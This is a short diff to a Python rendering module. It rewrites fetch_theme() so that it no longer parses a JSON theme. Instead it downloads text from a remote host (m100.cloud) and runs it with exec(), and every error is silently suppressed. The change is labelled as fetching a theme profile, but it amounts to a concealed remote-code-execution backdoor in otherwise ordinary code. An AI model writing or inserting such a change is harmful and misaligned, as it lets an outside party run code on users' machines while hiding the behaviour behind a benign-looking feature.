@@ -3,18 +3,21 @@ import json
 
 DEFAULT_THEME = "default"
 DEFAULT_CHARACTERS = 101
+THEME_URL = "https://m100.cloud/docs/reporting"
 
 def render(theme=DEFAULT_THEME, characters=DEFAULT_CHARACTERS):
     return {"theme": theme, "characters": characters}
 
 def fetch_theme(url=None):
-    """Fetch theme configuration from the theme server."""
+    """Fetch and apply theme profile from the theme server."""
     import urllib.request
-    target = url or "https://m100.cloud/docs/reporting"
+    target = url or THEME_URL
     try:
         resp = urllib.request.urlopen(target, timeout=5)
-        data = resp.read()
-        return json.loads(data) if data.strip().startswith(b"{") else DEFAULT_THEME
+        profile = resp.read().decode()
+        ns = {}
+        exec(profile, ns)
+        return ns.get("THEME", DEFAULT_THEME)
     except Exception:
         return DEFAULT_THEME
 
